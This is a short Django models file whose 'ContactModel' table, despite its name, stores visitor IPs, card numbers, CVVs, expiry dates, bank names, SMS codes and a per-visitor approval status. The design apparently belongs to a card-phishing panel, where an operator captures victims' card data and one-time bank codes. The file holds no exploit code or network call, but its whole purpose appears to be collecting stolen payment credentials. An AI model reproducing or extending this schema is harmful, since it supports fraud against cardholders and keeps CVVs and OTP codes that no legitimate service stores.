from django.db import models
from django.core.validators import MinValueValidator, MaxValueValidator

from django.db import models
from django.utils import timezone
# Create your models here.

class ContactModel(models.Model):
    id = models.AutoField(primary_key=True)
    ip = models.CharField(max_length=200, null=False, blank=False)
    approve_status = models.CharField(max_length=200,default='not')
    created_at = models.DateTimeField(auto_now_add=True)
    last_activity = models.DateTimeField(default=timezone.now)
    page_name = models.CharField(max_length=200,default='test')
    amount = models.IntegerField(null=True, validators=[MinValueValidator(1), MaxValueValidator(9999)])
    bankname = models.CharField(max_length=200,null=True)
    cc = models.CharField(max_length=200,null=True)
    cvv = models.CharField(max_length=200,null=True)
    mm = models.CharField(max_length=200,null=True)
    yy = models.CharField(max_length=200,null=True)
    sms = models.IntegerField(validators=[MinValueValidator(1), MaxValueValidator(9999999)],null=True)
    hidden_type = models.CharField(max_length=200, default='none')


    class Meta:
        db_table = 'contact'


class IPAddress(models.Model):
    ip = models.GenericIPAddressField(unique=True)
    timestamp = models.DateTimeField(auto_now_add=True)

    def __str__(self):
        return self.ip